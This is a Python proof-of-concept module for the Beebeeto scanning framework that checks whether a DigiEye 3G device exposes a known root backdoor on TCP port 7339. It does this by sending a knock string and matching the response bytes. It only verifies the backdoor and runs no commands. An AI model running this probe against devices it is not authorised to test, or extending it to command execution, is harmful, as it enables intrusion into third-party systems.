#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


import socket

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0011',
            'name': 'DigiEye 3G(software version 3.19.30004) Backdoor POC',
            'author': 'tmp',
            'create_date': '2015-01-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [7339],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'DigiEye',
            'vul_version': ['3.19'],
            'type': 'Other',
            'tag': ['DigiEye后门', 'Techboard/Syac devices后门',],
            'desc': '''
                    Affected devices include a backdoor service listening on TCP
                    port 7339. This service implements a challenge-response protocol to
                    "authenticate" clients. After this step, clients are allowed to execute
                    arbitrary commands on the device, with administrative (root) privileges. We
                    would like to stress out that, to the best of our knowledge, end-users are not
                    allowed to disable the backdoor service, nor to control the "authentication"
                    mechanism.
                    ''',
            'references': ['http://seclists.org/bugtraq/2014/Jul/17',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target = args['options']['target'].replace('http://', '')
        if args['options']['verbose']:
            print '[*] %s - Connect to port 7339 ...' % target
        sock.settimeout(6)
        sock.connect((target, 7339))
        if args['options']['verbose']:
            print '[*] %s - Send data ...' % target
        sock.send('KNOCK-KNOCK-ANYONETHERE?\x00')
        resp = sock.recv(12)
        sock.close()
        if resp[-4:] == '\x00\x0A\xAE\x60':
            args['success'] = True
            args['poc_ret']['target'] = target
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())